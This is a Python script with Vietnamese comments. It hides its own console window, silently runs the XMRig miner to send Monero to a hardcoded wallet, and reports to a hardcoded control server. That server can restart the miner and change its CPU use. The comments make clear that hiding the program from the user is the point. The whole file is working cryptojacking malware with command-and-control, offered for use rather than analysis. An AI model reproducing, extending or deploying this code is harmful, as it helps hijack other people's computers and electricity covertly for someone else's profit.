# File: WORKER_CONTROL_65.pyw
# 65% CPU + Auto Restart + Farm Control Client
# ĐÃ ẨN HOÀN TOÀN - KHÔNG HIỆN CỬA SỔ GÌ HẾT
import os
import json
import getpass
import subprocess
import platform
import time
import psutil
import socket
import threading
import sys
import re
import ctypes   # ← thêm dòng này

# ẨN CỬA SỔ CONSOLE NGAY TỪ ĐẦU (chỉ cần 1 dòng này)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ============================================================
# CONTROL SERVER CONFIG
# ============================================================
SERVER_IP = "163.61.182.41"
SERVER_PORT = 8386
WORKER = getpass.getuser().lower()
# ============================================================
# XMRIG SETUP
# ============================================================
dir_path = os.path.dirname(__file__)
config_path = os.path.join(dir_path, "config.json")
xmrig_exe = os.path.join(dir_path, "xmrig.exe")

# XÓA HẾT CÁC DÒNG print() ĐẦU TIÊN ĐỂ KHÔNG HIỆN LOG (tùy chọn, tao xóa luôn cho sạch)
# print("[WORKER] Starting worker:", WORKER)  ← xóa hết mấy dòng này

threads = os.cpu_count() or 4
cpu_percent_target = 65
use_threads = max(1, int(threads * cpu_percent_target / 100.0))
rx_list = list(range(use_threads))
rx_mode = "light" if threads <= 4 else "medium" if threads <= 8 else "fast"

config = {
    "autosave": True,
    "background": False,
    "colors": True,
    "randomx": {"1gb-pages": False, "mode": rx_mode, "numa": True},
    "cpu": {
        "enabled": True, "huge-pages": False, "huge-pages-jit": False,
        "hw-aes": True, "priority": 3, "yield": True,
        "memory-pool": False, "max-threads-hint": 100, "rx": rx_list
    },
    "pools": [{
        "algo": "rx/0",
        "url": "gulf.moneroocean.stream:443",
        "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGpYPkUbB7t2qaKr4g",
        "pass": "x", "rig-id": WORKER, "tls": True, "keepalive": True
    }],
    "donate-level": 0,
    "print-time": 10
}
with open(config_path, "w") as f:
    json.dump(config, f, indent=4)

# ============================================================
# CHỈ SỬA ĐÚNG 1 HÀM start_xmrig() ĐỂ ẨN CỬA SỞ xmrig.exe
# ============================================================
def start_xmrig():
    return subprocess.Popen(
        [xmrig_exe],
        cwd=dir_path,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS  # ← thêm dòng này là xmrig.exe ẩn 100%
    )

# ============================================================
# Giữ nguyên hết phần còn lại (không thay đổi gì hết)
# ============================================================
def kill_xmrig():
    for proc in psutil.process_iter():
        try:
            if "xmrig" in proc.name().lower():
                proc.kill()
        except:
            pass

def check_output(line):
    return "H/s" in line or "speed" in line or "accepted" in line

def parse_hash(line):
    line = line.strip()
    line = re.sub(r'\x1b[^m]*m', '', line)
    m = re.search(r'(\d+\.?\d*)\s*(K|M)?\s*H/s', line)
    if not m: return None
    val = float(m.group(1))
    unit = m.group(2)
    if unit == "K": val *= 1000
    elif unit == "M": val *= 1000000
    return val

miner = start_xmrig()
last_ok = time.time()
last_hash = 0.0

def connect_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

sock = connect_server()
sock.sendall(f"HELLO|{WORKER}\n".encode())

def apply_cpu_limit(percent):
    global cpu_percent_target, use_threads, rx_list, miner
    cpu_percent_target = max(1, min(int(percent), 100))
    use_threads = max(1, int(threads * cpu_percent_target / 100.0))
    rx_list = list(range(use_threads))
    try:
        with open(config_path, "r") as f:
            cfg = json.load(f)
        cfg["cpu"]["rx"] = rx_list
        with open(config_path, "w") as f:
            json.dump(cfg, f, indent=4)
    except: pass
    try:
        if miner and miner.stdin:
            miner.stdin.write(f"threads {use_threads}\n")
            miner.stdin.flush()
    except: pass

def control_listener():
    global sock
    while True:
        try:
            data = sock.recv(1024).decode(errors="ignore")
            if not data: raise Exception("disconnect")
            for line in data.splitlines():
                line = line.strip()
                if line.startswith("CMD|RESTART"):
                    kill_xmrig()
                    time.sleep(1)
                    os.execl(sys.executable, sys.executable, *sys.argv)
                elif line.startswith("CMD|SETCPU|"):
                    p = int(line.split("|")[2])
                    apply_cpu_limit(p)
        except:
            time.sleep(3)
            sock = connect_server()
            sock.sendall(f"HELLO|{WORKER}\n".encode())

def control_sender():
    global last_hash, sock
    while True:
        try:
            cpu = psutil.cpu_percent(interval=1)
            msg = f"STATUS|{WORKER}|{last_hash}|{cpu}\n"
            sock.sendall(msg.encode())
        except: pass
        time.sleep(5)

threading.Thread(target=control_listener, daemon=True).start()
threading.Thread(target=control_sender, daemon=True).start()

# Main loop giữ nguyên, chỉ xóa các print() để không log ra console (vì console đã ẩn)
while True:
    try:
        line = miner.stdout.readline()
        if line:
            line = line.strip()
            if check_output(line):
                last_ok = time.time()
            h = parse_hash(line)
            if h is not None:
                last_hash = h
        if time.time() - last_ok > 30 or miner.poll() is not None:
            kill_xmrig()
            time.sleep(2)
            miner = start_xmrig()
            last_ok = time.time()
    except:
        time.sleep(1)